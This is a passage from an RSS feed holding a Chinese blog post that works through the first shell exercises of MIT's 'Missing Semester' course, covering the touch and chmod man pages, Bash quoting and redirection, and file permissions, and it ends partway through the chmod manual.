&lt;p>尼采在本书中想要构建的道德谱系学便这样开始了，在 gut und böse, gut und schlecht 的辨析中拉开了他的大幕。&lt;/p></description></item><item><title>MITMS01a_课程概述与Shell</title><link>https://nepl1t.github.io/p/mitms01a_%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%BF%B0%E4%B8%8Eshell/</link><pubDate>Fri, 03 Nov 2023 22:15:08 +0800</pubDate><guid>https://nepl1t.github.io/p/mitms01a_%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%BF%B0%E4%B8%8Eshell/</guid><description>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">本文配置环境为 Ubuntu Linux 22.04.2 LTS
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="正文">正文
&lt;/h2>&lt;ol>
&lt;li>本课程需要使用类Unix shell，例如 Bash 或 ZSH。如果您在 Linux 或者 MacOS 上面完成本课程的练习，则不需要做任何特殊的操作。如果您使用的是 Windows，则您不应该使用 cmd 或是 Powershell；您可以使用Windows Subsystem for Linux或者是 Linux 虚拟机。使用echo $SHELL命令可以查看您的 shell 是否满足要求。如果打印结果为/bin/bash或/usr/bin/zsh则是可以的。&lt;/li>
&lt;li>在 /tmp 下新建一个名为 missing 的文件夹。&lt;/li>
&lt;li>用 man 查看程序 touch 的使用手册&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h3 id="touch命令">touch命令
&lt;/h3>&lt;p>&lt;code>touch&lt;/code> 的使用手册分解如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">TOUCH(1) User Commands TOUCH(1)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NAME
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> touch - change file timestamps
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SYNOPSIS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> touch [OPTION]... FILE...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DESCRIPTION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Update the access and modification times of each FILE to the current
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> time.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>touch&lt;/code> 程序的用途是，其基本语法是 &lt;code>touch [OPTION]... FILE...&lt;/code> ，可以将 &lt;code>FILE&lt;/code> 文件的访问时间、修改时间改成当前系统时间。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> A FILE argument that does not exist is created empty, unless -c or -h
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> is supplied.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> A FILE argument string of - is handled specially and causes touch to
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> change the times of the file associated with standard output.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Mandatory arguments to long options are mandatory for short options
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> too.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>如果指定的 &lt;code>FILE&lt;/code> 文件并不存在，程序将会创建一个新的 &lt;code>FILE&lt;/code> 文件，除非 &lt;code>[OPTION]&lt;/code> 中使用了 &lt;code>-c&lt;/code> &lt;code>-h&lt;/code> 等参数。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> -a change only the access time
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -c, --no-create
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> do not create any files
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -d, --date=STRING
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> parse STRING and use it instead of current time
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -f (ignored)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -h, --no-dereference
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> affect each symbolic link instead of any referenced file (useful
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> only on systems that can change the timestamps of a symlink)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -m change only the modification time
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -r, --reference=FILE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> use this file&amp;#39;s times instead of current time
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -t STAMP
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> use [[CC]YY]MMDDhhmm[.ss] instead of current time
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --time=WORD
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> change the specified time: WORD is access, atime, or use: equiv‐
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> alent to -a WORD is modify or mtime: equivalent to -m
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --help display this help and exit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --version
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> output version information and exit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Note that the -d and -t options accept different time-date formats.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DATE STRING
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> The --date=STRING is a mostly free format human readable date string
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> such as &amp;#34;Sun, 29 Feb 2004 16:21:42 -0800&amp;#34; or &amp;#34;2004-02-29 16:21:42&amp;#34; or
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> even &amp;#34;next Thursday&amp;#34;. A date string may contain items indicating cal‐
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> endar date, time of day, time zone, day of week, relative time, rela‐
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tive date, and numbers. An empty string indicates the beginning of the
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> day. The date string format is more complex than is easily documented
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> here but is fully described in the info documentation.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">AUTHOR
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Written by Paul Rubin, Arnold Robbins, Jim Kingdon, David MacKenzie,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> and Randy Smith.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">REPORTING BUGS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> GNU coreutils online help: &amp;lt;https://www.gnu.org/software/coreutils/&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Report any translation bugs to &amp;lt;https://translationproject.org/team/&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">COPYRIGHT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Copyright © 2022 Free Software Foundation, Inc. License GPLv3+: GNU
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> GPL version 3 or later &amp;lt;https://gnu.org/licenses/gpl.html&amp;gt;.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> This is free software: you are free to change and redistribute it.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> There is NO WARRANTY, to the extent permitted by law.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SEE ALSO
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Full documentation &amp;lt;https://www.gnu.org/software/coreutils/touch&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> or available locally via: info &amp;#39;(coreutils) touch invocation&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">GNU coreutils 9.1 January 2023 TOUCH(1)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这一栏则列出了 &lt;code>touch&lt;/code> 程序的作者、反馈方式、版权信息等其他信息。&lt;/p>
&lt;hr>
&lt;ol start="4">
&lt;li>用 touch 在 missing 文件夹中新建一个叫 semester 的文件。&lt;/li>
&lt;/ol>
&lt;p>以上步骤运行如图&lt;/p>
&lt;p>&lt;img src="https://nepl1t.github.io/image.png"
loading="lazy"
alt="第1至4步"
>&lt;/p>
&lt;ol start="5">
&lt;li>将以下内容一行一行地写入 semester 文件：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#!/bin/sh
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>curl --head --silent https://missing.csail.mit.edu
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nepl1t.github.io/image-1.png"
loading="lazy"
alt="第5步"
>&lt;/p>
&lt;p>由图我们可以看到，直接写入的命令似乎没有作用，而双引号包括住要写入的第一行会让 shell 报错。&lt;/p>
&lt;p>只有命令 &lt;code>echo ‘#!/bin/sh’ &amp;gt; semester&lt;/code> 起到了作用。因为 &lt;code>#&lt;/code> 在Bash中表示注释，而 ! 即使被双引号（&amp;quot;）包裹也具有特殊的含义。 &lt;strong>单引号（&amp;rsquo;）则不一样，此处利用这一点解决输入问题。&lt;/strong>（更多信息请参考 &lt;a class="link" href="https://www.gnu.org/software/bash/manual/html_node/Quoting.html" target="_blank" rel="noopener"
>Bash quoting 手册&lt;/a>）&lt;/p>
&lt;p>然后写入第二行命令，注意 &lt;code>&amp;gt;&lt;/code> 的重定义效果是直接覆写，而 &lt;code>&amp;gt;&amp;gt;&lt;/code> 才是追加内容：&lt;/p>
&lt;p>&lt;img src="https://nepl1t.github.io/image-2.png"
loading="lazy"
alt="两个重定向符号的区别"
>&lt;/p>
&lt;p>注意到指令 &lt;code>echo 'curl --head --silent https://missing.csail.mit.edu' &amp;gt; semester&lt;/code> 直接将 semester 文件的内容从 &lt;code>#!bin/sh&lt;/code> 覆写成了 &lt;code>curl --head --silent https://missing.csail.mit.edu&lt;/code>&lt;/p>
&lt;p>而 将 &lt;code>&amp;gt;&lt;/code> 改为 &lt;code>&amp;gt;&amp;gt;&lt;/code> 才可以&lt;em>另起一行&lt;/em>并追加内容&lt;/p>
&lt;ol start="6">
&lt;li>尝试执行这个文件。例如，将该脚本的路径（./semester）输入到您的shell中并回车。如果程序无法执行，请使用 ls 命令来获取信息并理解其不能执行的原因。&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://nepl1t.github.io/image-3.png"
loading="lazy"
alt="文件权限"
>&lt;/p>
&lt;p>&lt;code>-rw-rw-r--&lt;/code> 告诉我们作为一个文件，我作为创建者（neplit）是只有读取和写入的权限，&lt;strong>但没有运行权限&lt;/strong>。因此我们运行指令 &lt;code>./semester&lt;/code> 是会报 access denied 的。&lt;/p>
&lt;p>&lt;img src="https://nepl1t.github.io/image-4.png"
loading="lazy"
alt="ahoh"
>&lt;/p>
&lt;p>同时这也告诉我们 &lt;code>touch&lt;/code> 指令创建的文件是不会给我们执行权限的，我们只有读取和写入权限。&lt;/p>
&lt;ol start="7">
&lt;li>查看 &lt;code>chmod&lt;/code> 的手册(例如，使用 &lt;code>man chmod&lt;/code> 命令)&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h3 id="chmod命令">chmod命令
&lt;/h3>&lt;p>&lt;code>chmod&lt;/code> 的使用手册分解如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">NAME
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> chmod - change file mode bits
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>其表明 &lt;code>chmod&lt;/code> 命令用于修改文件的权限模式。&lt;/p>
&lt;p>Linux/Unix 系统的文件调用权限分为三级：文件所有者、用户组与其他用户（这里上课笔记中有）&lt;/p>
&lt;p>&lt;img src="https://nepl1t.github.io/image-5.png"
loading="lazy"
alt="文件权限图解"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">SYNOPSIS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> chmod [OPTION]... MODE[,MODE]... FILE...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> chmod [OPTION]... OCTAL-MODE FILE...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> chmod [OPTION]... --reference=RFILE FILE...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DESCRIPTION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> This manual page documents the GNU version of chmod. chmod changes the file mode bits of
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> each given file according to mode, which can be either a symbolic representation of
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> changes to make, or an octal number representing the bit pattern for the new mode bits.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>chmod&lt;/code> 命令的基本语法是 &lt;code>chmod [OPTION] MODE[,MODE] FILE&lt;/code> 。其中的 &lt;code>MODE&lt;/code> 是该命令用于更改文件权限的依据（chmod changes the file mode bits of each given file according to mode），其可以使用&lt;strong>符号表示&lt;/strong>（Symbolic representation）或者&lt;strong>八进制数表示&lt;/strong>（an octal number representing the bit pattern for the new mode bits）。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> The format of a symbolic mode is [ugoa...][[-+=][perms...]...], where perms is either zero
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> or more letters from the set rwxXst, or a single letter from the set ugo. Multiple sym‐
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bolic modes can be given, separated by commas.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>符号表示&lt;/strong> 的基本格式是 &lt;code>[ugoa...][[-+=][perms...]...]&lt;/code>&lt;/p>
&lt;p>如果要同时根据多个符号表示来修改文件权限，不同的符号表示之间可以用逗号分隔开，如下面的指令将两个符号表示 &lt;code>u+r&lt;/code> 与 &lt;code>go-r&lt;/code>分开来：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">chmod u+r,go-r docs
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>该指令修改了文件 docs 的权限：所有者获得了读取权限，而除所有者外其他用户都失去了读取权限。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zed" data-lang="zed">&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">A&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">combination&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">letters&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ugoa&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">controls&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">which&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">access&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">to&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">will&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">be&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">changed&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">who&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">owns&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">it&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">u&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">other&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">g&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">other&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">not&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">in&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">o&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">or&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">all&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">If&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">none&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">these&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">are&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">given&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">effect&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">is&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">as&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">if&lt;/span>&lt;span class="w">
